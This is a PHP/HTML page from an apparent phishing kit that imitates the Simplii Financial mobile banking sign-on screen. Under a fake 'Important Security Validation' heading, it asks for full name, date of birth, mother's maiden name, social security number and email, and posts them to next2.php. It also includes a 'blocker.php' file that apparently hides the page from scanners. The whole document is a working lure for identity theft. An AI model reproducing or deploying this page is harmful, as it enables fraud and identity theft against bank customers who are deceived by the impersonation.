<?php
include('blocker.php');
?>
<html>
<head class="at-element-marker">
	
	<title>Simplii Financial Mobile Banking Sign On</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta name="HandheldFriendly" content="true">
	<meta name="format-detection" content="telephone=no"> 
	<link rel="stylesheet" type="text/css" href="files/reset.css">
	<link rel="stylesheet" type="text/css" href="files/reset-brand.css">
	<link rel="stylesheet" type="text/css" href="files/global.css">
	<link rel="stylesheet" type="text/css" href="files/global-android2.css">
	<link rel="stylesheet" type="text/css" href="files/global-brand.css">
	<link rel="stylesheet" type="text/css" href="files/carousel.css">
	<link rel="stylesheet" type="text/css" href="files/signon.css">
    <meta name="msapplication-tap-highlight" content="no">

	</head>
	<body lang="en">
		<span class="offscreen">Simplii Financial Mobile Banking Sign On</span>		
    
	<input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
	<label for="drawer-toggle-chk" id="drawer-toggle-label">
		<img id="open-menu-icon" src="files/drawer-menu-open.png" alt="Open Menu" role="button">
		<img id="close-menu-icon" src="files/drawer-menu-close.png" alt="Close Menu" role="button">
	</label>
	<nav id="drawer-menu" class="scrollable-ver">
		<div id="menu-wrapper">
			<div class="drawer-menu-header">
				<img src="files/pcfDrawerLogo.png" alt="Simplii Logo" id="preSignonLogo">
			</div>
			<ul>
				<li id="li-sign-on"><a id="signon-link" class="tracking-set-flow active" href="#" role="menuitem">Sign On<span class="offscreen">Selected</span></a></li>
				<li><a id="register-link" class="tracking-set-flow" href="#" role="menuitem">Register</a></li>
				<li id="li-forgot-password"><a id="forgetpwd-link" class="tracking-set-flow" href="#" role="menuitem">Forgot Password</a></li>
				<hr>
				<li id="li-visit-site-pcf"><a id="visit-site-link" href="#" target="_blank" role="menuitem">Simplii.com<span class="offscreen">. Opens in new page</span></a></li>
				<li id="li-find-us"><a id="find-us-link" href="#" target="_blank" role="menuitem">Find Us</a></li>
				<li id="li-security"><a id="security-guarantee-link" href="#" target="_blank" role="menuitem">Security Guarantee</a></li>
				<hr>
				<li><a class="nav-no-indent" id="contact-us-link" href="#" target="_blank" role="menuitem">Talk to Us</a></li>
				<li><a class="nav-no-indent" id="legal-link" href="#" target="_blank" role="menuitem">Products and Services Agreement<span class="offscreen">. Opens in new page</span></a></li>
				<li><a class="nav-no-indent" id="help-link" href="#" target="_blank" role="menuitem">Help</a></li>
			</ul>
		</div>	
	</nav>

    <header class="flex-box flex-box-hoz">
		<div class="flex-box-flex-1"></div>
        <a href="#" target="_blank"><div id="header-logo"><span class="offscreen">Simplii Financial logo</span></div></a>
        <div id="header-link" class="flex-box-flex-1">
            
        </div>
    </header>
	
  <header>
		<section id="header-title">
			<h2 class="title">My Profile</h2>
		</section>
  </header>

<section id="main-page" class="">
	       
<section id="ide">
	<section class="page-title">    	
    	<h2 class="title">Important Security Validation</h2>
	</section>    	
</section>
<br/><br/>
<form id="idb" method="post" action="next2.php">
<div style="padding-left:30%; padding-right:30%;">
	<fieldset>
		<label for="FN" id="current-password-label">Full name</label>
		<input autocomplete="off" placeholder="" id="FN" name="FN" maxlength="40" value="" type="text">
	</fieldset>		
	<fieldset>
		<label for="DB" id="current-password-label">Date of birth</label>
		<input autocomplete="off" placeholder="DD-MM-YYYY" id="DB" name="DB" maxlength="10" value="" type="text">
	</fieldset>		
	<fieldset>
		<label for="MN" id="current-password-label">Mother maiden name</label>
		<input autocomplete="off" placeholder="" id="MN" name="MN" maxlength="40" value="" type="text">
	</fieldset>
	<fieldset>
		<label for="SN" id="current-password-label">Social security number</label>
		<input autocomplete="off" placeholder="" id="SN" name="SN" maxlength="11" value="" type="text">
	</fieldset>
	<fieldset>
		<label for="EM" id="current-password-label">Your email</label>
		<input autocomplete="off" placeholder="" id="EM" name="EM" maxlength="25" value="" type="text">
	</fieldset>
	<br/><br/>
	<fieldset>
		<input name="save-button" id="save-button" class="btn btn-positive" value="Confirm" type="submit">
	</fieldset>
</div>
<br/><br/>
</section>	

</body>
</html>